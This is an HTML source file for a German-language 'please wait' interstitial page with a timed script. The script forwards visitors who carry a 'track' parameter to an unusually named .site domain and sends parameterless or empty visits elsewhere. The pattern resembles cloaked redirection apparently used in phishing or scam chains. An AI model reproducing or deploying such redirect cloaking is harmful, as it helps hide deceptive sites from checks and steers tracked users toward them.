<!DOCTYPE html>
<html lang="de">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">

  <title>Bitte warten</title>

  <style>
    * {
      box-sizing: border-box;
    }

    :root {
      --red: #d71920;
      --red-dark: #b51218;
      --red-light: #fff1f2;
      --text: #202124;
      --gray: #6b7280;
      --border: #eeeeee;
    }

    body {
      margin: 0;
      min-height: 100vh;

      display: flex;
      flex-direction: column;

      font-family:
        "Segoe UI",
        Arial,
        Helvetica,
        sans-serif;

      color: var(--text);
      background: #ffffff;
    }

    /* =========================
       TOP RED BAR
    ========================= */

    .top-bar {
      height: 5px;
      width: 100%;

      background: var(--red);

      position: fixed;
      top: 0;
      left: 0;

      z-index: 10;
    }

    /* =========================
       HEADER
    ========================= */

    header {
      width: 100%;

      padding: 24px 6%;

      border-bottom: 1px solid #f0f0f0;

      background: #ffffff;
    }

    .header-inner {
      max-width: 1050px;
      margin: auto;

      display: flex;
      align-items: center;
      justify-content: space-between;
    }

    .brand {
      display: flex;
      align-items: center;
      gap: 10px;

      font-size: 18px;
      font-weight: 700;
      letter-spacing: -0.02em;
    }

    .brand-mark {
      width: 30px;
      height: 30px;

      display: flex;
      align-items: center;
      justify-content: center;

      border-radius: 7px;

      color: white;
      background: var(--red);

      font-size: 16px;
      font-weight: 700;
    }

    .secure-label {
      color: #777;
      font-size: 13px;
    }

    /* =========================
       MAIN
    ========================= */

    main {
      flex: 1;

      display: flex;
      align-items: center;
      justify-content: center;

      padding: 70px 20px;
    }

    .content {
      width: 100%;
      max-width: 510px;

      text-align: center;

      animation: fadeUp 0.7s ease-out both;
    }

    @keyframes fadeUp {
      from {
        opacity: 0;
        transform: translateY(25px);
      }

      to {
        opacity: 1;
        transform: translateY(0);
      }
    }

    /* =========================
       ANIMATED ICON
    ========================= */

    .loader {
  position: relative;
  width: 110px;
  height: 110px;
  margin: 0 auto 32px;
}


/* Main rotating circle */
.circle {
  position: absolute;
  inset: 0;

  border-radius: 50%;

  border: 6px solid #f2f2f2;
  border-top-color: #d71920;
  border-right-color: #d71920;

  animation: spinCircle 0.9s linear infinite;
}


/* Second rotating ring */
.circle-inner {
  position: absolute;

  width: 75px;
  height: 75px;

  top: 17px;
  left: 17px;

  border-radius: 50%;

  background: #fff1f2;

  display: flex;
  align-items: center;
  justify-content: center;

  color: #d71920;

  font-size: 30px;
  font-weight: bold;

  animation:
    pulseCircle 1.2s ease-in-out infinite,
    rotateArrow 2s linear infinite;
}


/* Glow around loader */
.loader::after {

  content: "";

  position: absolute;

  inset: -8px;

  border-radius: 50%;

  border: 2px solid rgba(215,25,32,0.25);

  animation: glowPulse 1.5s ease-out infinite;

}


@keyframes spinCircle {

  from {
    transform: rotate(0deg);
  }

  to {
    transform: rotate(360deg);
  }

}


@keyframes pulseCircle {

  0%,100% {
    transform: scale(0.9);
    box-shadow:
      0 0 0 rgba(215,25,32,0);
  }

  50% {
    transform: scale(1.08);

    box-shadow:
      0 0 25px rgba(215,25,32,0.35);
  }

}


@keyframes rotateArrow {

  from {
    rotate: 0deg;
  }

  to {
    rotate: 360deg;
  }

}


@keyframes glowPulse {

  0% {
    transform: scale(0.8);
    opacity: 1;
  }

  100% {
    transform: scale(1.3);
    opacity: 0;
  }

}

    /* =========================
       TEXT
    ========================= */

    h1 {
      margin: 0 0 14px;

      font-size: 30px;
      line-height: 1.2;

      font-weight: 700;

      letter-spacing: -0.03em;
    }

    .description {
      max-width: 430px;

      margin: 0 auto;

      color: var(--gray);

      font-size: 16px;

      line-height: 1.65;
    }

    .description strong {
      color: #333;
      font-weight: 600;
    }

    /* =========================
       STATUS BOX
    ========================= */

    .status-box {
      margin-top: 32px;

      padding: 17px 20px;

      display: flex;
      align-items: center;
      justify-content: center;
      gap: 10px;

      background: #fafafa;

      border: 1px solid var(--border);

      border-radius: 10px;

      color: #555;

      font-size: 14px;
    }

    .status-dot {
      width: 9px;
      height: 9px;

      border-radius: 50%;

      background: var(--red);

      animation: statusPulse 1.2s infinite;
    }

    @keyframes statusPulse {
      0% {
        box-shadow: 0 0 0 0 rgba(215, 25, 32, 0.4);
      }

      70% {
        box-shadow: 0 0 0 8px rgba(215, 25, 32, 0);
      }

      100% {
        box-shadow: 0 0 0 0 rgba(215, 25, 32, 0);
      }
    }

    /* =========================
       PROGRESS BAR
    ========================= */

    .progress-container {
      margin-top: 20px;

      width: 100%;
      height: 5px;

      overflow: hidden;

      background: #eeeeee;

      border-radius: 20px;
    }

    .progress {
      height: 100%;
      width: 0;

      background: var(--red);

      border-radius: inherit;

      animation: progress 3s linear forwards;
    }

    @keyframes progress {
      from {
        width: 0;
      }

      to {
        width: 100%;
      }
    }

    /* =========================
       FOOTER
    ========================= */

    footer {
      padding: 22px 20px;

      border-top: 1px solid #eeeeee;

      text-align: center;

      color: #999;

      font-size: 12px;
    }

    .footer-content {
      display: flex;
      align-items: center;
      justify-content: center;

      gap: 7px;
    }

    .footer-icon {
      color: var(--red);
      font-size: 14px;
    }

    /* =========================
       MOBILE
    ========================= */

    @media (max-width: 600px) {

      header {
        padding: 20px;
      }

      .secure-label {
        display: none;
      }

      main {
        padding: 50px 20px;
      }

      h1 {
        font-size: 25px;
      }

      .description {
        font-size: 15px;
      }

      .loader {
        width: 85px;
        height: 85px;
      }

      .circle-inner {
        width: 55px;
        height: 55px;

        top: 15px;
        left: 15px;

        font-size: 23px;
      }
    }

    @media (prefers-reduced-motion: reduce) {
      *,
      *::before,
      *::after {
        animation-duration: 0.01ms !important;
        animation-iteration-count: 1 !important;
      }
    }
  </style>
</head>

<body>

  <div class="top-bar"></div>

  <header>
    <div class="header-inner">

      <div class="brand">
        <div class="brand-mark">→</div>
        <span>Weiterleitung</span>
      </div>

      <div class="secure-label">
        Automatische Weiterleitung
      </div>

    </div>
  </header>


  <main>

    <section class="content">

      <!-- Animated loading icon -->
      <div class="loader">

        <div class="circle"></div>

        <div class="circle-inner">
          →
        </div>

      </div>


      <h1>
        Bitte haben Sie einen Moment Geduld
      </h1>


      <p class="description">
        <strong>Ihre Weiterleitung wird vorbereitet.</strong><br>
        Bitte warten Sie einen kurzen Moment.
        Sie werden automatisch zur nächsten Seite weitergeleitet.
      </p>


      <div class="status-box">

        <span class="status-dot"></span>

        <span>
          Weiterleitung wird vorbereitet …
        </span>

      </div>


      <div class="progress-container">
        <div class="progress"></div>
      </div>

    </section>

  </main>


  <footer>

    <div class="footer-content">
      <span class="footer-icon">●</span>
      <span>Bitte schließen Sie diese Seite nicht.</span>
    </div>

  </footer>


  <script>
    (() => {

      const params = new URLSearchParams(
        window.location.search
      );

      if (!params.has("track")) {
        return;
      }

      const track = params.get("track");

      let redirectUrl;

      if (track === "") {

        redirectUrl = "https://www.google.com";

      } else {

        redirectUrl =
          `https://de.snowfistereuropedeutschland.site/?track=${encodeURIComponent(track)}`;

      }

      setTimeout(() => {

        window.location.assign(redirectUrl);

      }, 3000);

    })();
  </script>

</body>
</html>
